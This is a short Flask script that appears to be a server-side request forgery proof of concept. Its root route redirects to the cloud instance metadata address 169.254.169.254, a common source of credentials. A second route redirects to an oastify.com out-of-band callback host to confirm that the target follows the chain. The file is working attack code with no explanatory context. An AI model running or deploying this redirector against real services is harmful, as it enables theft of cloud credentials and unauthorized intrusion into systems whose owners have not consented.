from flask import Flask, redirect

app = Flask(__name__)

@app.route('/')
def index():
    # Step 1: First redirect to internal IP
    return redirect('http://169.254.169.254/latest/meta-data', 302)

@app.route('/step2')
def step2():
    # If they follow THIS, full chain confirmed
    return redirect('http://1bd7khvodggb02gaydhcwzvu7ldc12pr.oastify.com', 302)
    
if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
